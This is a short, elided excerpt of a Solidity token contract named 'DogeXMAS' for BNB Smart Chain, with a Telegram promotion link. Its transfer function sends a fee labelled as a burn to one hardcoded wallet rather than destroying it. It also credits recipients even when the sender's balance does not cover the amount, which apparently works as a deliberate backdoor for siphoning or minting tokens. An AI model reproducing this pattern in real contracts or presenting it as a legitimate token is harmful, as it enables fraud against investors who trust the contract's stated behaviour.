...
// Submitted for Telegram: https://t.me/dogexmas_bsc
...
contract  DogeXMAS  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x93471682C5F623107a24e415152241F73f80d2b1] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x93471682C5F623107a24e415152241F73f80d2b1, _bruntoken);
        }
